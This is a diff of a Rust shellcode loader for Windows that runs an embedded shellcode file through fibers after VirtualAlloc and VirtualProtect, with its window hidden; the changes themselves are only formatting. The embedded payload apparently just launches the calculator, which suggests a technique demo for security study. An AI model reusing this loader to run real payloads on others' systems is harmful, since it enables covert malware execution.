@@ -1,9 +1,11 @@
 #![windows_subsystem = "windows"]
 
 use std::mem::transmute;
-use std::ptr::{null, null_mut, copy};
+use std::ptr::{copy, null, null_mut};
 use windows_sys::Win32::Foundation::FALSE;
-use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE, VirtualAlloc, VirtualProtect};
+use windows_sys::Win32::System::Memory::{
+    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
+};
 use windows_sys::Win32::System::Threading::{ConvertThreadToFiber, CreateFiber, SwitchToFiber};
 
 static SHELLCODE: [u8; 113] = *include_bytes!("../../win-exec-calc-shellcode.bin");
@@ -18,12 +20,7 @@ fn main() {
             eprintln!("ConvertThreadToFiber failed!");
         }
 
-        let dest = VirtualAlloc(
-            null(),
-            SIZE,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE
-        );
+        let dest = VirtualAlloc(null(), SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if dest == null_mut() {
             eprintln!("VirtualAlloc failed!");
         }
